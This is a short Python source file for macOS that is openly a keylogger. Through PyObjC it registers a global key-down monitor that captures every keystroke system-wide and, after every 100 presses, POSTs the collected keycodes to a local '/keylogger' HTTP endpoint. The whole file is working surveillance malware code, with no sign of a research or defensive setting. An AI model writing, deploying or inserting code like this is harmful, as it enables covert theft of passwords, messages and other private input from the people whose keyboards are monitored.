from AppKit import NSApplication, NSApp
from Foundation import NSObject, NSLog
from Cocoa import NSEvent, NSKeyDownMask
from PyObjCTools import AppHelper
import requests

data = []
dataCount = 0

class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, notification):
        mask = NSKeyDownMask
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask, handler)

def handler(event):
    global dataCount
    if dataCount == 100:
        r = requests.post('http://localhost:1337/keylogger', data= {'data': data}, timeout=None)
        dataCount = 0
    try:
        dataCount += 1
        data.append(event.keyCode())
    except KeyboardInterrupt:
        AppHelper.stopEventLoop()

def main():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()
    
if __name__ == '__main__':
    main()